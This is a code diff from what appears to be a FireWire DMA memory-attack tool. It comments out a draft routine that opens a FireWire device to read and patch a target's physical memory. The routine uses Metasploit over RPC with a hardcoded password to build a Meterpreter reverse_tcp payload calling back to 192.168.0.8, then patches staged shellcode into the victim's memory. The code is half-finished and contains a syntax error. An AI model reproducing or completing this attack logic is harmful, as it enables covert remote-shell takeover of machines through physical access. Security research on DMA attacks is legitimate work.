@@ -126,108 +126,107 @@ stage2 = {
 
 def run():
 
-    # Initialize
-    # TODO: externalize this
-    if not cfg.filemode:
-        try:
-            fw = firewire.FireWire()
-        except IOError:
-            term.fail('Could not initialize FireWire. Are the modules ' +
-                      'loaded into the kernel?')
-        start = time.time()
-        device_index = fw.select_device()
+    # # Initialize
+    # # TODO: externalize this
+    # if not cfg.filemode:
+    #     try:
+    #         fw = firewire.FireWire()
+    #     except IOError:
+    #         term.fail('Could not initialize FireWire. Are the modules ' +
+    #                   'loaded into the kernel?')
+    #     start = time.time()
+    #     device_index = fw.select_device()
 
-    # Lower DMA shield or use a file as input, and set memsize
-    device = None
-    memsize = None
-    if cfg.filemode:
-        device = util.MemoryFile(cfg.filename, cfg.PAGESIZE)
-        memsize = os.path.getsize(cfg.filename)
-    else:
-        elapsed = int(time.time() - start)
-        device = fw.getdevice(device_index, elapsed)
-        memsize = 2 * cfg.GiB
+    # # Lower DMA shield or use a file as input, and set memsize
+    # device = None
+    # memsize = None
+    # if cfg.filemode:
+    #     device = util.MemoryFile(cfg.filename, cfg.PAGESIZE)
+    #     memsize = os.path.getsize(cfg.filename)
+    # else:
+    #     elapsed = int(time.time() - start)
+    #     device = fw.getdevice(device_index, elapsed)
+    #     memsize = 2 * cfg.GiB
 
-    memspace = MemorySpace(device, memsize)
+    # memspace = MemorySpace(device, memsize)
 
-    # Connect to msf and generate shellcode(s)
-    try:
-        client = MsfRpcClient('abc123')
-    except MsfRpcError as e:
-        term.fail(e)
+    # # Connect to msf and generate shellcode(s)
+    # try:
+    #     client = MsfRpcClient('abc123')
+    # except MsfRpcError as e:
+    #     term.fail(e)
 
-    name = term.poll('What MSF payload do you want to use?',
-        default='windows/meterpreter/reverse_tcp')
-    try:
-        module = PayloadModule(client, name)
-    except MsfRpcError as e:
-        term.fail(e)
+    # name = term.poll('What MSF payload do you want to use?',
+    #     default='windows/meterpreter/reverse_tcp')
+    # try:
+    #     module = PayloadModule(client, name)
+    # except MsfRpcError as e:
+    #     term.fail(e)
 
     
-    # term.poll('Options:')
-    # options = {'LHOST': 'localhost'}
-    module['LHOST'] = '192.168.0.8'
-    # module['ForceEncode'] = False
-    # module['-t'] = 'raw'
-    # opts = {'ForceEncode': False}
-    try:
-        payload = module.execute(Encoder='generic/none').get('payload') # **{'-t': 'raw'}
-    except MsfRpcError as e:
-        term.fail(e)
+    # # term.poll('Options:')
+    # # options = {'LHOST': 'localhost'}
+    # module['LHOST'] = '192.168.0.8'
+    # # module['ForceEncode'] = False
+    # # module['-t'] = 'raw'
+    # # opts = {'ForceEncode': False}
+    # try:
+    #     payload = module.execute(Encoder='generic/none').get('payload') # **{'-t': 'raw'}
+    # except MsfRpcError as e:
+    #     term.fail(e)
 
-    needed = [x for x in module.required if x not in module.advanced]
-    # for o in module.advanced:
+    # needed = [x for x in module.required if x not in module.advanced]
+    # # for o in module.advanced:
+    # #     print('{0}: {1}'.format(o, module[o]))
+    # # print('---')
+    # # for o in module.required:
+    # #     print('{0}: {1}'.format(o, module[o]))
+    # # print('---')
+    # for o in needed:
     #     print('{0}: {1}'.format(o, module[o]))
-    # print('---')
-    # for o in module.required:
-    #     print('{0}: {1}'.format(o, module[o]))
-    # print('---')
-    for o in needed:
-        print('{0}: {1}'.format(o, module[o]))
-    # print(payload)
-    # print(util.bytes2hexstr(payload))
+    # # print(payload)
+    # # print(util.bytes2hexstr(payload))
 
-    # TODO: Allow users to set required options
+    # # Allow users to set required options
 
-    # Search for signature and patch
-    address, signature, offset, chunks = memspace.find(stage1)[0]
-    # Signature found, let's patch
-    # TODO: Externalize
-    mask = 0xfffff000 # Mask away the lower bits to find the page number
-    page = int((address & mask) / cfg.PAGESIZE)
-    term.info('Signature found at {0:#x} in page no. {1}'.format(address, page))
-    success, backup = memspace.patch(address, chunks)
+    # # Search for signature and patch
+    # address, signature, offset, chunks = memspace.find(stage1)[0]
+    # # Signature found, let's patch
+    # # TODO: Externalize
+    # mask = 0xfffff000 # Mask away the lower bits to find the page number
+    # page = int((address & mask) / cfg.PAGESIZE)
+    # term.info('Signature found at {0:#x} in page no. {1}'.format(address, page))
+    # success, backup = memspace.patch(address, chunks)
 
-    # Figure out what os & architecture we're attacking and select stage
-    target = stage2[signature.os_architectures[0]]
+    # # Figure out what os & architecture we're attacking and select stage
+    # target = stage2[signature.os_architectures[0]]
 
-    # Concatenate stage and payload
+    # # Concatenate stage and payload
 
-    # Replace EXITFUNC with THREAD (it's hardcoded as PROCESS)
-    # This helps ensure that the process doesn't crash if the exploit fails
+    # # Replace EXITFUNC with THREAD (it's hardcoded as PROCESS)
+    # # This helps ensure that the process doesn't crash if the exploit fails
 
+    # # Write back original page
+    # success = memspace.patch(address, backup)
 
-    # Write back original page
-    success = memspace.patch(address, backup)
+    # address, signature, offset, chunks = memspace.find(stage)[0]
+    # # Signature found, let's patch
+    # # TODO: Externalize
+    # mask = 0xfffff000 # Mask away the lower bits to find the page number
+    # page = int((address & mask) / cfg.PAGESIZE)
+    # term.info('Signature found at {0:#x} in page no. {1}'.format(address, page))
+    # success, backup = memspace.patch(address, ##)
 
-    address, signature, offset, chunks = memspace.find(stage)[0]
-    # Signature found, let's patch
-    # TODO: Externalize
-    mask = 0xfffff000 # Mask away the lower bits to find the page number
-    page = int((address & mask) / cfg.PAGESIZE)
-    term.info('Signature found at {0:#x} in page no. {1}'.format(address, page))
-    success, backup = memspace.patch(address, ##)
+    # # Copy off original memory content in the region where stage 1 will be written
 
-    # Copy off original memory content in the region where stage 1 will be written
+    # # Patch with stage 1 - allocates a memory page and writes signature to frame boundary, and jumps to it
 
-    # Patch with stage 1 - allocates a memory page and writes signature to frame boundary, and jumps to it
+    # # Search for signature
 
-    # Search for signature
+    # # Restore the original memory content where stage 1 was written (overwrite it)
 
-    # Restore the original memory content where stage 1 was written (overwrite it)
-
-    # Patch with stage 2 - forks / creates and executes a new thread with prepended shellcode
-    exit(0)
+    # # Patch with stage 2 - forks / creates and executes a new thread with prepended shellcode
+    # exit(0)
     # Initialize and lower DMA shield
     if not cfg.filemode:
         try:
